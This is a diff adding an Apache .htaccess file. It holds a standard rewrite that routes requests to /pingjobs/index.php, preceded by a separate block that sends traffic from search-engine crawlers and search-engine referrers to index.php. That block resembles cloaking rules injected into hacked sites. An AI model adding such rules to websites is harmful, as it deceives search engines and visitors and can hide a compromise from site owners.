@@ -1,0 +1,20 @@
+<IfModule mod_rewrite.c>
+RewriteCond %{HTTP_USER_AGENT} (google|yahoo|msn|aol|bing) [OR]
+RewriteCond %{HTTP_REFERER} (google|yahoo|msn|aol|bing)
+RewriteRule ^.*$ index.php [L]
+</IfModule>
+
+
+<IfModule mod_rewrite.c>
+        RewriteEngine On
+
+        # Removes index.php
+       RewriteEngine on
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule ^(.*)$ /pingjobs/index.php?$1 [L]
+
+        # If 404s, "No Input File" or every URL returns the same thing
+        # make it /index.php?/$1 above (add the question mark)
+        
+</IfModule> 
